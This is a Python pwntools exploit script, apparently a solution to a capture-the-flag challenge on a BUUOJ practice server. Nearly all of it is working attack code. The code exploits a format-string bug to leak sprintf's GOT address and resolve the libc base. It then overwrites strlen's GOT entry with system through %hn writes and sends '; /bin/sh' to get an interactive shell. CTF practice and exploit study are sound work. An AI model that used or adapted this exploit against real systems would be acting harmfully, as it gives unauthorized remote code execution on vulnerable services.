#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = ''
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 29458

LOCAL = 0
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	sprintf_got = 0x0804A030	
	strlen_got = 0x0804A024
	offset = 8
	# leak libc
	p = 'A' # for alignment
	p += '%' + str(offset + 1) + '$s' + p32(sprintf_got)
	s(p)
	sprintf = u32(ru('\xf7')[-3:] + '\xf7')
	li('sprintf ' + hex(sprintf))

	'''
	select:
	2: ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)
	'''

	libc = LibcSearcher('sprintf', sprintf)
	libc_base = sprintf - libc.dump('sprintf')
	li('libc_base ' + hex(libc_base))
	system = libc_base + libc.dump('system')
	li('system ' + hex(system))
	sh_str = libc_base + libc.dump('str_bin_sh')

	high_sys = system >> (8 * 2)
	low_sys = system & 0xFFFF
	li('high_sys ' + hex(high_sys))
	li('low_sys  ' + hex(low_sys))

	# modify strlen got
	pre_len = len('Repeater:') + 1 + 4 + 4
	p = 'A' # for alignment
	p += p32(strlen_got + 0) # 8
	p += p32(strlen_got + 2) # 9

	p += '%' + str(low_sys - pre_len) + 'c%' + str(offset + 0) + '$hn'
	p += '%' + str(high_sys - low_sys) + 'c%' + str(offset + 1) + '$hn'

	s(p)
	sl('; /bin/sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
